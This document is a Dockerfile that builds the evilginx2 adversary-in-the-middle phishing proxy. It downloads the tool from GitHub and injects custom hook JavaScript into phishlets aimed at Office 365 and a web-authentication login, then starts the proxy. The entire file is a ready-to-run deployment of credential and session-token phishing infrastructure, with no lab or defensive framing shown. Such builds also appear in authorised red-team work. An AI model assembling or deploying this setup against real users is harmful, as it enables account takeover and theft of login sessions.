FROM ubuntu:25.04

ARG VERSION="v3.3.0"

RUN apt-get update && apt-get install -y curl unzip gettext-base && rm -rf /var/lib/apt/lists/* 

RUN curl -L https://github.com/kgretzky/evilginx2/releases/download/${VERSION}/evilginx-${VERSION}-linux-64bit.zip -o evilginx.zip

RUN mkdir /opt/evilginx 

RUN unzip evilginx.zip -d /opt/evilginx
WORKDIR /opt/evilginx/
RUN chmod +x /opt/evilginx/evilginx

COPY ./config /opt/evilginx/config
COPY ./phishlets /opt/evilginx/phishlets
COPY ./templates /opt/evilginx/templates
COPY ./src /opt/evilginx/src

RUN    sed -e 's/^/                        /' /opt/evilginx/src/hooklibs.js > /opt/evilginx/src/tmp_hooklibs.js \
    && sed -e 's/^/                        /' /opt/evilginx/src/hook.js > /opt/evilginx/src/tmp_hook.js 

RUN    cat /opt/evilginx/src/tmp_hooklibs.js >> /opt/evilginx/phishlets/o365.yaml \
    && cat /opt/evilginx/src/tmp_hook.js >> /opt/evilginx/phishlets/o365.yaml

RUN    cat /opt/evilginx/src/tmp_hooklibs.js >> /opt/evilginx/phishlets/webauth.yaml \
    && cat /opt/evilginx/src/tmp_hook.js >> /opt/evilginx/phishlets/webauth.yaml

ENTRYPOINT ["/opt/evilginx/evilginx"]
CMD ["-p", "/opt/evilginx/phishlets", "-c", "/opt/evilginx/config", "-developer" , "-debug"]
 
STOPSIGNAL SIGKILL